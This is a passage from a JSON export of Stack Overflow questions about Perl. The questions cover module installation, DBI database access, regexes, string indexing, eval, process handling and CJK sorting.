is that I cannot figure out how I am supposed to pass objects to pwmsearch. The source code of pwmsearch as shown in the documentation above says it takes in $matrixobj and $seqobj, which I have stored as files matrix and sequence. </p>\n\n<p>So after googling around on what I could try, I tried doing things like:</p>\n\n<pre><code>pwmsearch('matrix','sequence'); \n</code></pre>\n\n<p>or</p>\n\n<pre><code>open FILE, 'matrix.txt' or die \"Couldn't open file\";\n$matrix.=&lt;FILE&gt;\nclose FILE;\n\nopen FILE, 'sequence' or die \"Couldn't open file\";\n$seq.=&lt;FILE&gt;\nclose FILE;\npwmsearch($matrix,$seq)\n</code></pre>\n\n<p>But all of them makes perl bark at me with various errors. What am I doing wrong and what could I do to fix them?</p>\n"},{"tags":["mysql","perl","windows-xp","installation","strawberry-perl"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":668,"score":4,"question_id":4206439,"title":"Sequenced steps to install Perl Strawberry, MySQL, and DBD::mysql on Windows XP","body":"<p>I'm looking for a good guide with sequenced and detailed steps for installing Perl Strawberry, MySQL, and DBD::mysql on Windows XP.</p>\n\n<p>The main goal I want to accomplish here is to have the ability to create databases and perform regular actions against them via Perl Strawberry using DBD::mysql</p>\n\n<p>I've found <a href=\"http://www.perlmonks.org/?node_id=738062\" rel=\"nofollow\">this</a> so far, but it's a little out-dated and I don't want to go through all that just to find out that it doesn't work.</p>\n\n<p>The furthest I've gotten on my own (on another computer) is getting Perl Strawberry installed and to work properly, getting MySQL installed, and ATTEMPT to use <code>cpan DBD::mysql</code> to install the module (which failed because it couldn't find MySQL - I also tried the <code>--with-mysql=C:\\path\\to\\mysql</code> option it suggests, but that does't work for me)</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1794,"score":3,"question_id":4216300,"title":"how to find last index of string in perl","body":"<p>I am new to perl scripting. Can some one tell me how to find the last indexof substring in a string which is repeat several times in the string.</p>\n\n<p>Actully I want to extract the file name from a give path</p>\n\n<pre><code> $outFile = \"C:\\\\AOTITS\\\\BackOffice\\\\CSVFiles\\\\test.txt\";\n</code></pre>\n\n<p>If I can find the last string of the '\\' I cand extract the file name using <code>substr</code> function. I already did that in the following way. But it is inefficient.</p>\n\n<pre><code>$fragment =  $outFile ;\n$count = index($fragment, \"\\\\\");\nwhile($count &gt; -1) {\n    $fragment =  substr ($fragment, index($fragment, '\\\\')+1);\n    $count = index($fragment, '\\\\');\n }\n</code></pre>\n\n<p>Can some one tell me a way to do that in a efficient way.  </p>\n"},{"tags":["mysql","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12721851,"title":"Get the fetched values from the database","body":"<p>I need to store the fetched data from the MySQL database. So I used this code.</p>\n\n<pre><code>while (@row = $statement-&gt;fetchrow_array) \n{\n  print \"@row.\\n\"; #        ------printing data\n}\n\nforeach $key(@row)\n{\n  print $key.\"\\n\"; # ------empty data\n}\n</code></pre>\n\n<p>In foreach loop the @row data is empty. How to solve this</p>\n\n<p><strong>UPDATE</strong>: It actually should be like this:</p>\n\n<pre><code>while (my @row = $statement-&gt;fetchrow_array) { \n  # print \"@row.\\n\";\n  foreach my $key(@row) { \n    $query= \"ALTER TABLE tablename DROP FOREIGN KEY $key;\"; \n    $statement = $connection-&gt;prepare($query); \n    $statement-&gt;execute() \n      or die \"SQL Error: $DBI::errstr\\n\"; \n  } \n}\n</code></pre>\n"},{"tags":["perl","email","command-line","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":735,"score":0,"question_id":4713625,"title":"Help sending email usings the linux mail command in a perl CGI script","body":"<p>How can I send an html email using the linux command line inside of a perl CGI script. \nI tried:</p>\n\n<pre><code>system(echo $message | mail -s $subject $email);\n</code></pre>\n"},{"tags":["regex","perl","parsing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12717088,"title":"Perl: Parse for an unknown value in a known location","body":"<p>Given the follow text format, how can I get the 'User number' value in-between the brackets?  The format is the same, but the values within the brackets change from file to file.</p>\n\n<pre><code>User name [michael]\nUser age [25]\nUser number [2432]\nUser city [Memphis]\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12721511,"title":"Why index function in Perl is behaving strangely here","body":"<p>Here is the sample code:</p>\n\n<pre><code>my $test = \"Mike Xavier Smith/123-45-1111/student\";\nmy $name = substr( $test, 0, index($test, \"/\") );\nmy $ssn = substr( $test,index($test,\"/\"));\nmy $type = substr( $test,index($test, \"/\", 2) );\nprint \"$name, $ssn, $type \\n\";\nexit;\n</code></pre>\n\n<p>Output:\nMike Xavier Smith, /123-45-1111/student, /123-45-1111/student</p>\n\n<p>This line substr( $test,index($test, \"/\", 2) ); #offset should be from second occurrence of \"/\" which means it should print /student.<br>\n<strong>But why it is printing from first occurrence of \"/\"?</strong></p>\n"},{"tags":["perl","postgresql","psql"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12710535,"title":"How to insert the form arrays from URL to DBD database using perl script?","body":"<p>I am trying to get the data filled in the html to DBD database using perl script.</p>\n\n<p>Here is my html code:</p>\n\n<pre><code>&lt;html&gt;\n&lt;/head&gt;\n\n\n&lt;body&gt;\n&lt;H1&gt;Friend's contact book&lt;/H1&gt;\n\n&lt;FORM ACTION=\"contact.pl\" METHOD=\"POST\"&gt;\n\n\n&lt;HR&gt;\n&lt;H2&gt;Friend's contact&lt;/H2&gt;\n\n&lt;PRE&gt;\n          Name:&lt;INPUT TYPE=\"text\" NAME=\"name\"&gt; \n         Address:&lt;INPUT TYPE=\"text\" NAME=\"add\"&gt; \n\n\n&lt;/PRE&gt;\n\n&lt;/HR&gt;&lt;P&gt;\n&lt;INPUT TYPE=\"submit\" VALUE=\"Sign Up\"&gt; or &lt;INPUT TYPE=\"reset\" VALUE=\"Cancel\"&gt;\n&lt;/P&gt;\n&lt;/FORM&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>Here is my perl script:\ncontact.pl</p>\n\n<pre><code>#!/usr/bin/perl\n\n# Initialize DBI.\nuse DBI;\nuse strict;\n\n# Make the database connection.\nmy $dbh = DBI-&gt;connect(\"dbi:Pg:dbname=friendcontact\") \nor die my $DBI::errstr;\n\n   # Store the SQL query\n\nmyy $stat = my $dbh-&gt;prepare(\"INSERT into friend (name, add) VALUE \n(?,?)\");\n\n   # Execute the query\n\nmy $stmh-&gt;execute();\n\n   # Tidy up\n\nmy $stmh-&gt;finish();\nmy $dbh-&gt;commit or die my $DBI::errstr;\n</code></pre>\n\n<p>I could not run the <strong>contact.pl</strong> code \nIt said <strong>\"Internal Server Error\"</strong></p>\n\n<p>Is there anyway I could correct this?</p>\n\n<p>Thanks alot in advance</p>\n\n<p>Thank you\nI had already edited the code as you said but it is having error with\nAfter <strong>updating:</strong>\n    Internal Server Error</p>\n\n<pre><code>The server encountered an internal error or misconfiguration and was unable to complete your request.\nPlease contact the server administrator, and inform them of the time the error occurred, and anything you might have done that may have caused the error.\n\nPremature end of script headers: /home/friendcontact/private/cgi-bin/contact.pl\n</code></pre>\n"},{"tags":["regex","perl","recursion"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":89,"score":2,"question_id":12719935,"title":"Regex with recursive expression to match nested braces?","body":"<p>I'm trying to match text like <code>sp { ...{...}... }</code>, where the curly braces are allowed to nest. This is what I have so far:</p>\n\n<pre><code>my $regex = qr/\n(                   #save $1\n    sp\\s+           #start Soar production\n    (               #save $2\n        \\{          #opening brace\n        [^{}]*      #anything but braces\n        \\}          #closing brace  \n        | (?1)      #or nested braces\n    )+              #0 or more\n)\n/x;\n</code></pre>\n\n<p>I just cannot get it to match the following text: <code>sp { { word } }</code>. Can anyone see what is wrong with my regex?</p>\n"},{"tags":["python","linux","perl","bash","tmux"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12719710,"title":"Removing display control codes from typescript / tmux output","body":"<p>I'm using the pipe-pane of tmux to record what I was doing, and I want to parse and take a account of the commands I typed etc.  But when I got the <code>xxx.log</code> file, and opened it with vim, I found that there are many special word like ^H,^M,^G etc,see the sample:  </p>\n\n<pre><code>administrator@ubuntu:~$ echo \"hello,world[K[K[K[K[K[K[K[K[K[K\"\nh\nadministrator@ubuntu:~$ ^G^G^G^G\nadministrator@ubuntu:~$ \n</code></pre>\n\n<p>I know that tmux records everything I typed, but some keys with Ctrl/alt prefix can not be displayed, and I want to ignore them. How can I archive that with perl/python or C, any tips?</p>\n"},{"tags":["regex","perl","unicode","pcre"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":188,"score":5,"question_id":5840018,"title":"Does PCRE support unicode string correctly?","body":"<p>Does <a href=\"http://www.pcre.org/\" rel=\"nofollow\">PCRE</a> support unicode string correctly?</p>\n"},{"tags":["perl","arguments","eval"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12717193,"title":"Perl passing argument into eval","body":"<p>I'm facing an issue using eval function.</p>\n\n<p>Indeed I have some function name inside a SQL database, my goal is to execute those functions within perl (after retrieve in SQL).</p>\n\n<p>Here is what I'm doing, considering that $RssSource->{$k}{Proceed} contains \"&amp;test\" as a string retrieved from SQL:</p>\n\n<pre><code>my $str2 = \"ABCD\";\neval \"$RssSource-&gt;{$k}{Proceed}\";warn if $@;\n\nsub test\n{\n   my $arg = shift;\n\n   print \"fct TEST -&gt; \", $row, \"\\n\";\n}\n</code></pre>\n\n<p>This is working correctly and display:</p>\n\n<pre><code>fct TEST -&gt;\n</code></pre>\n\n<p>However I would like to be able to pass $str2 as an argument to $RssSource->{$k}{Proceed} but I don't know how, every syntax I tried return an error:</p>\n\n<pre><code>eval \"$RssSource-&gt;{$k}{Proceed}$str2\"\neval \"$RssSource-&gt;{$k}{Proceed}($str2)\"\neval \"$RssSource-&gt;{$k}{Proceed}\"$str2\neval \"$RssSource-&gt;{$k}{Proceed}\"($str2)\n</code></pre>\n\n<p>May someone tell me how to properly pass an argument to the evaluated function?</p>\n\n<p>Thanks a lot for your help</p>\n\n<p>Regards.</p>\n\n<p>Florent</p>\n"},{"tags":["osx","perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":215,"score":5,"question_id":12718104,"title":"Installing JSON::XS on Mac OSX","body":"<p>I hope you're all ready for a long adventure through my frustration:</p>\n\n<p>I'm using Perl 5.10, on Mac OSX : Snow Leopard, with XCode 3.2.6.</p>\n\n<p>What I am trying to do is use the module JSON::XS in a program.</p>\n\n<p>This is the first time that I've ever done something with Perl, so I look up some simple example programs and try them out, and they all work. Then I go to use JSON::XS. I get:</p>\n\n<pre><code>Can't locate JSON/XS.pm in @INC (@INC contains: /Library/Perl/Updates/5.10.0 /System/Library/Perl/5.10.0/darwin-thread-multi-2level /System/Library/Perl/5.10.0 /Library/Perl/5.10.0/darwin-thread-multi-2level /Library/Perl/5.10.0 /Network/Library/Perl/5.10.0/darwin-thread-multi-2level /Network/Library/Perl/5.10.0 /Network/Library/Perl /System/Library/Perl/Extras/5.10.0/darwin-thread-multi-2level /System/Library/Perl/Extras/5.10.0 .) at part1.pl line 5.\nBEGIN failed--compilation aborted at part1.pl line 5.\n</code></pre>\n\n<p>I do some Googling, and figure that it needs to be installed. Also in my Googling I find heavy recommendations to use cpanm. So I try installing cpanm first using cpan (which I already have).</p>\n\n<p>I get a very long printout, that basically says NO, NOT OK, \"chances to succeed are limited\", and FAILED over and over and over again. It's too long to include in its entirety, but the bits I found interesting are:</p>\n\n<pre><code>Warning (usually harmless): 'YAML' not installed, will not store persistent state\nRunning make test\nCan't test without successful make\nRunning make install\nMake had returned bad status, install seems impossible\nCould not read '/Users/danielgierl/.cpan/build/ExtUtils-ParseXS-3.15-VSmBrZ/META.yml'. Falling back to other methods to determine prerequisites\n</code></pre>\n\n<p>I look into installing YAMl, because sections of output like the above (which I got repeatedly) make me think that's the problem. Essentially it also failed, and among other reasons it gave me warnings like the above.</p>\n\n<p>Another section of the output says:</p>\n\n<pre><code>make: *** No rule to make target `/System/Library/Perl/5.10.0/darwin-thread-multi-2level/CORE/config.h', needed by `Makefile'.  Stop.\n</code></pre>\n\n<p>I look this up online, and though I understand why it says what it does, I see no way that I could fix this, since these are Makefiles gotten from cpan or elsewhere.</p>\n\n<p>Another section:</p>\n\n<pre><code>Running install for module 'version'\nRunning make for J/JP/JPEACOCK/version-0.9901.tar.gz\nHas already been unwrapped into directory /Users/danielgierl/.cpan/build/version-0.9901-U8IMPt\nCould not make: Unknown error\nWarning (usually harmless): 'YAML' not installed, will not store persistent state\nRunning make test\nCan't test without successful make\nRunning make install\nMake had returned bad status, install seems impossible\n</code></pre>\n\n<p>In general lots of unknown errors. I am also trouble by the section where it tells me:</p>\n\n<pre><code>Testing if you have a C compiler\nld: library not found for -lbundle1.o\ncollect2: ld returned 1 exit status\nlipo: can't open input file: /var/folders/1C/1CnzBuv+F5y+8M5YPm6I4k+++TI/-Tmp-//ccTWRqov.out (No such file or directory)\nerror building /var/folders/1C/1CnzBuv+F5y+8M5YPm6I4k+++TI/-Tmp-/compilet.bundle from /var/folders/1C/1CnzBuv+F5y+8M5YPm6I4k+++TI/-Tmp-/compilet.o at /System/Library/Perl/5.10.0/ExtUtils/CBuilder/Base.pm line 213.\n\nI cannot determine if you have a C compiler\nso I will install a perl-only implementation\n\nYou can force installation of the XS version with\n\nperl Makefile.PL --xs\n</code></pre>\n\n<p>I know for a fact that I have a c compiler, since gcc -v tells me that it is version 4.2.1. On the plus side, it does tell me that my kit looks good (whatever that is). If I try running the command they recommend me, I get told that there is no such file or directory.</p>\n\n<p>After some more Googling, I keep seeing XCode re-re-referenced for Mac users. I already had a version of XCode, but because it might have problems, I uninstall it, then get version 3.2.6 (my OS is too old for the newer versions). The install fails for unknown reasons, and it tells me to contact the software company. However, before it fails, it does install the UNIX tools, including gcc (which I later got the latest version for), so I don't think that's the problem.</p>\n\n<p>All in all, this has consumed some 6 hours of my time today, and I'm stressed and physically ill (though I was this morning before starting this futile venture, but it's been exacerbated), and I have no idea where I am supposed to go next.</p>\n\n<p>I'm hoping that it's all been some stupid error that'll be remedied in 10 seconds by an experienced user, but I fear the worst. In general I've done every bit of advice I've found, from running with --sudo to sacrificing a goat to the sun gods. I'd appreciate any help.</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":73,"score":3,"question_id":12712754,"title":"regex to match word boundary beginning with special characters","body":"<p>I have regex that matches words fine except if they contain a special character such as \n~Query which is the name of a member of a C++ class.\nNeed to use word boundary as shown below for member names that are single characters.\n<code>$key =~ /\\b$match\\b/</code></p>\n\n<p>I tried numerous expressions I thought would work such as <code>/[~]*\\b$match\\b/</code> or <code>/\\b[~]*$match\\b/</code></p>\n\n<p>Is it possible to put a word boundary on words that may contain a special character?</p>\n"},{"tags":["perl","email","header"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12718169,"title":"How to create mail Header Message-ID","body":"<p>I'm wondering is there any possible way to generate sha1 mail header message-id.\nOn command below I use Perl module \"Email::MessageID\".</p>\n\n<p>Command:</p>\n\n<p>perl -MEmail::MessageID -e 'my $mid = Email::MessageID->new->in_brackets;print \"Message-ID: $mid\\x0A\\x0D\";'</p>\n\n<p>Output:</p>\n\n<p>Message-ID: &lt;1349305411.bDf18ac0.3235@gate></p>\n"},{"tags":["perl","process","fork","pid","sigchld"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12716912,"title":"perl, no child process w/ \"open\"","body":"<p>Hi I have this problem where the perl script spits back \"No child process found at\" ...</p>\n\n<p>My script calls several different types of forks, so I tried implementing the perldoc's waitpid() implementation method to be able to use handle both fork &amp; exec &amp; system &amp; qw.</p>\n\n<pre><code> $SIG{CHLD} = sub {\n    # don't change $! and $? outside handler\n    local ($!, $?);\n    my $pid = waitpid(-1, WNOHANG) &gt; 0;\n    return if $pid == -1;\n    return unless defined $children{$pid};\n    delete $children{$pid};\n};\n\n    my $pid = fork();\n    die \"cannot fork\" unless defined $pid;\n    if ($pid == 0) {\n        # ...\n        exit 0;\n    } else {\n        $children{$pid}=1;\n        # ...\n        exec($command);\n   }\n</code></pre>\n\n<p>There is no problem with this part of the execution of the code, however the \"No child processor found\" occurs when I try to close the filehandle's CLOSE. Can someone explain to me how come this is happening, as I really want to understand this problem more in depth. Do I end up reaping the child process forked by the OPEN call, so that the close doesn't know how to handle the file handle? or maybe I'm 100% off. Any solutions would be appreciated</p>\n\n<pre><code>open(RESULTS, \"-|\", \"find $dir\\/ -maxdepth 1 -name RESULTS -print0 | xargs -0 cat \") or die $!;\nwhile(&lt;RESULTS&gt;){\nif($_ =~ /match/){\n    print $_;\n }\n  }\n close RESULTS;\n</code></pre>\n"},{"tags":["perl","shell","unix","vim","script"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":12715894,"title":"Opening multiple files in text editor with find command","body":"<p>I am trying to open multiple files in vim from the command line with this command. For some reason I am getting an erro as you will see below.</p>\n\n<pre><code> $ find . -name edit.html.erb  \\\n     | perl -pi -e 's/^..//'   \\\n     | perl -pi -e 's/\\n$/ /'  \\\n     | vim\n</code></pre>\n\n<p>When I run it without \"| vim\" as in this command:</p>\n\n<pre><code> $ find . -name edit.html.erb  \\\n     | perl -pi -e 's/^..//'   \\\n     | perl -pi -e 's/\\n$/ /'\n</code></pre>\n\n<p>And get this output:</p>\n\n<pre><code> addresses/edit.html.erb claims/edit.html.erb emails/edit.html.erb owners/edit.html.erb packages/edit.html.erb users/edit.html.erb vessels/edit.html.erb voyages/edit.html.erb %\n</code></pre>\n\n<p>I get an error that probably has something to do with that \"%\" mark at the end of the output.</p>\n\n<p>Here is the output and error:</p>\n\n<pre><code> Vim: Warning: Input is not from a terminal\n Vim: Error reading input, exiting...\n Vim: preserving files...\n Vim: Finished.\n</code></pre>\n\n<p>How can I fix this? Not sure which of the parts is causing the error since I'm a newb, but any help would be appreciated!</p>\n"},{"tags":["perl","oop"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":12710344,"title":"A module to generate a table automatically in perl","body":"<p>I have some content on my STDOUT and i want that content need to be arranged in to a descent table.</p>\n\n<p>Can anyone suggest me a Perl module that does handle this kind of requirement </p>\n\n<p>Thanks in Advance, any small help is appreciated.</p>\n\n<p>Thanks!\nAditya</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12717052,"title":"Perl regex that matches the first substring specified","body":"<p>I need to extract data from an HTML document and compose an XML document with only interesting information. The way I'm doing this is by transforming the HTML doc into an XML doc, step by step. I have the 5 outermost XML tags in one line each, now I'm trying to structure what's inside of those. </p>\n\n<p>I have a line that's structured this way :</p>\n\n<pre><code>   &lt;myTag&gt; \n      blablabla &lt;a href=\"link/I/want\" *some css* &gt; title I want &lt;/a&gt; some other stuff &lt;a href=\"link that/I/don't/want\" *some css*&gt; text I don't want &lt;/a&gt; blablabla \n   &lt;/myTag&gt;\n</code></pre>\n\n<p>What I want is :</p>\n\n<pre><code>    &lt;myTag&gt;\n    &lt;link&gt;link/I/want&lt;/link&gt;\n    &lt;title&gt; title I want &lt;/title&gt;\n    &lt;/myTag&gt;\n</code></pre>\n\n<p>The regex I have is : </p>\n\n<pre><code>    /a href=\"(.*)\"(.*)&gt;(.*)&lt;\\/a&gt;/ \n</code></pre>\n\n<p>hoping to get  #$1 = url , $2 = whatever , $3 = title. </p>\n\n<p>This isn't working because it's taking this instead:</p>\n\n<pre><code>    &lt;myTag&gt;\n    &lt;link&gt;link/I/want *some css* &gt; title I want &lt;/a&gt; some other stuff &lt;a href=\"link that/I/don't/want\" *some css*&lt;/link&gt;\n    &lt;titl&gt;text I don't want&lt;/title&gt;\n    &lt;/myTag&gt;\n</code></pre>\n\n<p>How do I extract the content of the FIRST anchor tag of the line ? </p>\n\n<p>Thanks ! </p>\n"},{"tags":["perl","ipc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12705460,"title":"why IO::Pty and Expect modules can help to solute open2 's block?","body":"<p>the perl's open2 perldoc : <a href=\"http://perldoc.perl.org/IPC/Open2.html\" rel=\"nofollow\">http://perldoc.perl.org/IPC/Open2.html</a>\ndescript that :</p>\n\n<blockquote>\n  <p>his whole affair is quite dangerous, as you may block forever. It assumes it's going to talk to something like bc ....\n  ...\n  The IO::Pty and Expect modules from CPAN can help with this, as they provide a real tty (well, a pseudo-tty, actually), which gets you back to line buffering in the invoked command again.</p>\n</blockquote>\n\n<p>but I don't understand why IO::Pty and Except modules can solute the open2's problem?</p>\n\n<p>by the way , does the FileHandler return from open2 can be noblocking readed ?</p>\n\n<p>very thanks ! </p>\n"},{"tags":["perl","upload","cgi","unzip"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":173,"score":0,"question_id":6695408,"title":"perl cgi unzip an uploaded file","body":"<p>I am working on a web server where a user can upload a zip file. After uploading, it should unzip the file. I used the system command unzip as well as tried the Archive::Extract module. I still get the error </p>\n\n<p>Insecure dependency in eval while running with -T switch at /usr/lib/perl5/5.10.0/Module/Load/Conditional.pm line 332,  line 34</p>\n\n<p>Please help.</p>\n"},{"tags":["perl","module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12714032,"title":"How do I conditionally change @INC based on module version?","body":"<p>Background: I have a perl module -- let's call it <code>Foo::Common</code> which has been installed on one of our file servers (for the sake of simplicity, I will call thie the 'global' version). The module is included by somewhere on the order of 1000 perl scripts which are launched every 15 minutes. The module is several versions old, but Updating it is going to take a lot of testing over the course of several months.</p>\n\n<p>I'm writing a new perl script which will run on the same processing server, but I need functionality which is only included in the most recent version of <code>Foo::Common</code>. If I simply want to use the newer version of <code>Foo::Common</code>, I can place <code>Foo/Common.pm</code> in a <code>./lib</code>directory where the script is being run, then use the following code:</p>\n\n<pre><code>my $lib = '';\nBEGIN {\n    $lib = $ENV{FOO_ENV_HOME} || '';\n}\nuse lib \"$lib/core/bin/\";\nuse lib './lib';\nuse Foo::Common;\n</code></pre>\n\n<p>Because <code>use lib</code> adds directories to the beginning of <code>@INC</code>, the newer version of <code>Foo::Common</code> will be found and used first.</p>\n\n<p>This is all well and good, but I don't want my script dependent on the local version of <code>Foo::Common</code>. The global version of <code>Foo::Common</code> has <code>our $VERSION = '1.1.2'</code>, and the version that I want to install locally is at <code>1.1.7</code>. If I deploy the code above, and then we upgrade the global version to the not-yet-written <code>1.2.0</code>, my script will be stuck running <code>1.1.7</code>.</p>\n\n<p>According to <code>perldoc -f require</code>:</p>\n\n<pre><code>`require $filename` Has semantics similar to the following subroutine: \n\nsub require {\n   my ($filename) = @_;\n   if (exists $INC{$filename}) {\n       return 1 if $INC{$filename};\n       die \"Compilation failed in require\";\n   }\n   my ($realfilename,$result);\n   ITER: {\n       foreach $prefix (@INC) {\n           $realfilename = \"$prefix/$filename\";\n           if (-f $realfilename) {\n               $INC{$filename} = $realfilename;\n               $result = do $realfilename;\n               last ITER;\n           }\n       }\n       die \"Can't find $filename in \\@INC\";\n   }\n   if ($@) {\n       $INC{$filename} = undef;\n       die $@;\n   } elsif (!$result) {\n       delete $INC{$filename};\n       die \"$filename did not return true value\";\n   } else {\n       return $result;\n   }\n}\n</code></pre>\n\n<p>I'm not clear on how this interacts with the <code>use MODULE VERSION</code> syntax, although discussion in the answer to <a href=\"http://stackoverflow.com/questions/8914322/what-does-perl-do-when-two-versions-of-a-module-are-installed\">What does perl do when two versions of a module are installed?</a> indicates that <code>use Module Version</code> is not enough.</p>\n\n<p>I presume that I'm going to manipulate @INC, but I'm not sure how to do that based on each module's <code>$VERSION</code>, especially because <code>use</code> has an implicit <code>BEGIN</code>statement.</p>\n\n<p>How do I approach this?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12707596,"title":"Perl one-liner to remove trailing space from a file","body":"<p>I am calling a perl one-liner inside a Perl script.</p>\n\n<p>The intention of the one-liner is to remove the trailing space from a file. </p>\n\n<p>Inside the main perl script:</p>\n\n<pre><code>`perl -pi -e 's/\\s+$//' tape.txt`;\n</code></pre>\n\n<p>Now it is throwing me an error <code>Substitution replacement not terminated at -e line 2.</code></p>\n\n<p>Where is it going wrong? </p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":29,"score":-1,"question_id":12712595,"title":"Perl regex S&R when search token is a var that contains reserved chars","body":"<p>Consider this:</p>\n\n<pre><code>my $var = \"${SOME_VAR}\"\n\nmy $string \"In this text ${SOME_VAR} will be replaced with X\"\n\n$string =~ s/$var/X/g;\n\nprint \"\\nprocessed string = &lt;\".$string.\"&gt;\";\n</code></pre>\n\n<p>returns</p>\n\n<pre><code>processed string = &lt;In this text ${SOME_VAR} will be replaced with X&gt;\n</code></pre>\n\n<p>i.e. the replace does not take place.</p>\n\n<p>However, if $var does not contain a reserved character ($), the replace DOES take place:</p>\n\n<pre><code>my $var = \"SOME_VAR\"\n/* everything else the same */\n</code></pre>\n\n<p>returns</p>\n\n<pre><code>processed string = &lt;In this text ${X} will be replaced with X&gt;\n</code></pre>\n\n<p>But I do not know how to escape reserved characters when they are contained within a variable, i.e. when the search token is not explicit but parametarized.</p>\n\n<p>Any idea?</p>\n\n<p>Thanks</p>\n"},{"tags":["regex","perl","split"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":5437,"score":3,"question_id":674897,"title":"Perl regex split with new lines","body":"<p>I'm new to Perl and am working on a project for school and am stuck.</p>\n\n<p>Input: A given text file containing email addresses delimited by a space, tab, \",\", \";\" or â:â [can be on separate lines].</p>\n\n<p>I am trying to read in the email addresses and put them into an array.  I am able to parse the data on one line however if there are line breaks or returns I only get the last element.</p>\n\n<p>Can someone help me figure out how to take a list with each address on a separate line and parse them?  I have read a bit on regex but need much more practice.  Thanks.</p>\n\n<pre><code>open(EmailAddresses, \"EmailAdressesCommaList.txt\") || die \"Can not open file $!\";\n\n# \nwhile (&lt;EmailAddresses&gt;)\n{\n    chomp;\n    # Split the line into words\n    @lines = split /[ ,;:\\t\\r\\n(\\t\\r\\n\\s)+?]/;\n}\n\nforeach $value (@lines)\n{\n    print $value . \"\\n\";\n}\n</code></pre>\n"},{"tags":["perl","oracle","dbi"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":106,"score":3,"question_id":12708633,"title":"Which one represents null? undef or empty string","body":"<p>I want to insert <code>null</code> in a column in a table.</p>\n\n<p><strong>Which one represents null? <code>undef</code> or empty string <code>''</code>.</strong></p>\n\n<p>Which one should be used and Why? I know about <code>defined</code> and that I can check it.</p>\n\n<p>But I am looking more from perspective of database. </p>\n\n<p>Which one represents <code>null</code> more properly?</p>\n\n<p><strong>Update:</strong> I am using <code>DBI</code> module.</p>\n"},{"tags":["regex","perl","quoting"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12703055,"title":"getting weird error with regex '[","body":"<p>I am new with Perl and learning it. I write a script which provides word auto completion by tab as bash provides. If input is not in defined array, it prints predefined message and if input is in array then it run system command for the same.</p>\n\n<p>It runs fine as per my assumptions but if I input only [ character, it gives errors which i can't find that why it happens.</p>\n\n<p>One more thing, suppose, I type only tab without any character, it does not shows predefined commands in array.It only prompt.</p>\n\n<p>Kindly guide me and if I am wrong, please correct me.</p>\n\n<p>Before I am using bash shell scripts in that we have -x option to debug while run time, is there any option with Perl to do that?</p>\n\n<p>my script:</p>\n\n<pre><code> #!/usr/bin/perl\n\n use Term::Complete;\n use List::Util 'first';\n\n @cmd = qw/ls uptime clear/;\n while (defined @cmd) {\n\n     $in = Complete('prompt', @cmd);\n     if (first { /$in/ } @cmd) {\n\n         system($in);\n     }\n     elsif ($in eq 'exit') {\n\n         `kill -9 $$`;\n     }\n     else {\n\n         print \"Use these commands: ls uptime clear\";\n    }\n}\n</code></pre>\n\n<p>Error , if i enter [ :</p>\n\n<pre><code>perl tab1.pl \nprompt uptime\n12:02:31 up  3:29,  2 users,  load average: 0.00, 0.00, 0.00\nprompt [\nUnmatched [ in regex; marked by &lt;-- HERE in m/[ &lt;-- HERE / at tab1.pl line 8.\n</code></pre>\n\n<p>BR\nBen</p>\n"},{"tags":["perl","sorting","unicode","collation","cjk"],"answer_count":3,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":606,"score":5,"question_id":3891556,"title":"How do you sort CJK (Asian) characters in Perl, or with any other programming language?","body":"<p><strong>How do you sort Chinese, Japanese and Korean (CJK) characters in Perl?</strong></p>\n\n<p>As far as I can tell, sorting CJK characters by stroke count, then by radical, seems to be the way these languages are sorted. There are also some methods that sort by sounds, but this seems less common.</p>\n\n<p>I've tried using:</p>\n\n<pre><code>perl -e 'print join(\" \", sort qw(å·¥ ç¶ ä¸ äºº ä¸ å¤ äº )), \"\\n\";'\n# Prints: ä¸ ä¸ äº äºº å¤ å·¥ ç¶ which is incorrect\n</code></pre>\n\n<p>And I've tried using Unicode::Collate from CPAN, 